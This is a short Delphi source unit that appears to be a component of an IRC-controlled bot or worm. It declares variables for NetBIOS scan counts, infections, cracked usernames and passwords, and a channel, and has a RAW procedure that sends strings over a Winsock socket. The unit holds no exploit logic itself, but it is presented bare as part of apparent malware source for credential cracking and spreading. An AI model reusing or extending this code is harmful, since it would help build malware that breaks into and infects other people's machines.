   unit Unit1;

   interface

   USES WINSOCK,WINDOWS;

   VAR
    Sock1:TSocket;
    SockInfo:Sockaddr_in;
    WSAData:TWSAData;
    Channel:string;
    NB_PASS,
    NB_USERNAME,
    NB_INFECT,
    NB_OPEN,
    NB_CLOSED,
    NB_SCANNED:string;
    IP1,IP2,IP3:string;

   Procedure RAW(S:STRING);
   Procedure NB_INFO(No,Nc,Ns:string);
   Procedure NB_CRACK(UN,PW:string);
   function StrToInt(S: string): integer;
   function IntToStr(X: integer): string;

   implementation

   function IntToStr(X: integer): string;
   var
    S: string;
   begin
    Str(X, S);
    Result := S;
   end;

   function StrToInt(S: string): integer;
   var
    V, Code: integer;
   begin
    Val(S, V, Code);
    Result := V;
   end;

   Procedure NB_INFO(No,Nc,Ns:string);
   begin
    NB_OPEN    := NO;
    NB_CLOSED  := NC;
    NB_SCANNED := NS;
   end;

   Procedure NB_CRACK(UN,PW:string);
   begin
    NB_PASS := PW;
    NB_USERNAME := UN;
   end;

   Procedure RAW(S:STRING);
   begin
    Send(sock1,S[1],length(S),0);
    ZeroMemory(@S,sizeof(S));
   end;

   end.

